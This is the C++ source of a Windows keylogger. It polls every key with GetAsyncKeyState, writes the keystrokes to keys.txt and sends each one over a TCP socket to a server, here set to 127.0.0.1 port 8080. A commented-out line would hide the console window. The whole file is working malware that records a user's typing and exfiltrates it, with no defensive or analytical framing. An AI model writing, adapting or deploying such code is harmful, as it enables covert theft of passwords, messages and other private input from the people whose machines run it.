#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <string.h>
#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>

using namespace std;

void startLogging(struct sockaddr_in *serv_addr, SOCKET client_socket, const char* server_ip);
void startWinsock(WSADATA *wsaData);
SOCKET startSocket();
void connectToServer(struct sockaddr_in *serv_addr, SOCKET, const char* server_ip);
void sendMsg(SOCKET client_socket, const char *msg);
void closeSocket(SOCKET client_socket);

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
    //ShowWindow(GetConsoleWindow(), SW_HIDE);
    ofstream keys("keys.txt", ios::trunc); // clear the keys.txt file everytime this code is run
    
    SOCKET client_socket;
    struct sockaddr_in serv_addr;
    WSADATA wsaData;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(8080);
    const char* server_ip = "127.0.0.1";

    startWinsock(&wsaData);
    client_socket = startSocket();
    startLogging(&serv_addr, client_socket, server_ip);
    return 0; 
}

void startLogging(struct sockaddr_in *serv_addr, SOCKET client_socket, const char* server_ip){
    connectToServer(serv_addr, client_socket, server_ip);
    char c;
    while(true){
        for (c = 0; c < 255; c++){
            bool pressed = GetAsyncKeyState(c) & 0x1;
            if (pressed){
                // cout << c;
                ofstream keys;
                keys.open("keys.txt", ios::app);
                const char* text;
                switch (c) {
                    case VK_BACK:
                        text = "[backspace]";
                        keys << "[backspace]";
                        sendMsg(client_socket, text);
                        break;
                    case VK_RETURN:
                        text = "[enter]";
                        keys << "[enter]";
                        sendMsg(client_socket, text);
                        break;
                    case VK_SHIFT:
                        text = "[shift]";
                        keys << "[shift]";
                        sendMsg(client_socket, text);
                        break;
                    case VK_CONTROL:
                        text = "[ctrl]";
                        keys << "[ctrl]";
                        sendMsg(client_socket, text);
                        break;
                    case VK_CAPITAL:
                        text = "[caps]";
                        keys << "[caps]";
                        sendMsg(client_socket, text);
                        break;
                    case VK_TAB:
                        text = "[tab]";
                        keys << "[tab]";
                        sendMsg(client_socket, text);
                        break;
                    case VK_MENU:
                        text = "[alt]";
                        keys << "[alt]";
                        sendMsg(client_socket, text);
                        break;
                    case VK_LBUTTON:
                        break;
                    case VK_RBUTTON:
                        break; 
                    default:
                        char str[2] = {c, '\0'};
                        text = str;
                        keys << c;   
                        sendMsg(client_socket, text);
                }
                
            }
        }
    }
}

    
void startWinsock(WSADATA *wsaData) {
    if (WSAStartup(MAKEWORD(2, 2), wsaData) != 0) {
        std::cout << "WSAStartup failed\n";
        exit(EXIT_FAILURE);
    }
}

SOCKET startSocket(){
    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        std::cout << "Error at socket(): " << WSAGetLastError() << std::endl;
        WSACleanup();
    } else {
        std::cout << "Socket is OK!" << std::endl;
    }
    return clientSocket;
}


    //connection to server
void connectToServer(struct sockaddr_in *serv_addr, SOCKET client_socket, const char* server_ip) {
    if (inet_pton(AF_INET, server_ip, &serv_addr->sin_addr) <= 0) {
        printf("\nInvalid address/ Address not supported \n");
        closesocket(client_socket);
        WSACleanup();
        exit(EXIT_FAILURE);
    } else if(connect(client_socket, (struct sockaddr *)serv_addr, sizeof(*serv_addr)) == SOCKET_ERROR){
        std::cout << "Client: connect() - Failed to connect: " << WSAGetLastError() << std::endl;
        WSACleanup();
        exit(EXIT_FAILURE);
    } else {
        std::cout << "Client: Connect() is OK!" << std::endl;
        std::cout << "Client: Can start sending data..." << std::endl;
    }
}

void sendMsg(SOCKET client_socket, const char *msg) {
    //printf("Sending hello message to the server... ");
    //const char* msg = "Hello from my cpp client!";
    int sent = send(client_socket, msg, strlen(msg), 0);
    if(sent == SOCKET_ERROR){
        std::cout << "Server send error: " << WSAGetLastError() << std::endl;
    } else {
        std::cout << "Sent " << msg << std::endl;
    }
}

void closeSocket(SOCKET client_socket){
    closesocket(client_socket);
    WSACleanup();
}